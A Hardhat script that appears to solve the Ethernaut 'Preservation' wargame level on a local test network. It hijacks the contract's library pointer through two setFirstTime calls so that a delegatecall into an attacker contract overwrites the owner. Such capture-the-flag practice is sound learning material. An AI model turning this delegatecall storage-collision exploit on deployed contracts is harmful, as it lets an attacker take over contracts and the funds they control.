const { network, deployments, ethers, getNamedAccounts } = require('hardhat')

async function main() {
    const [owner, addr1, addr2] = await ethers.getSigners()

    const LibraryContract = await ethers.getContractFactory('LibraryContract')
    const libraryContract = await LibraryContract.connect(addr1).deploy()
    await libraryContract.deployed()

    const Preservation = await ethers.getContractFactory('Preservation')
    const preservation = await Preservation.deploy(libraryContract.address, libraryContract.address)
    await preservation.deployed()

    const LibHack = await ethers.getContractFactory('LibHack')
    const libHack = await LibHack.deploy()
    await libHack.deployed()

    const hacker = await preservation.connect(addr1)

    // ------------ let's hack -------------

    console.log(await preservation.timeZone1Library())
    console.log(await preservation.owner())

    await hacker.setFirstTime(libHack.address)
    console.log(await preservation.timeZone1Library())

    await hacker.setFirstTime(0)
    // await hackerHack.attack()

    console.log(await preservation.owner())
}

// hh run scripts/ethernaut1.js --network hardhat
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        process.exit(1)
    })
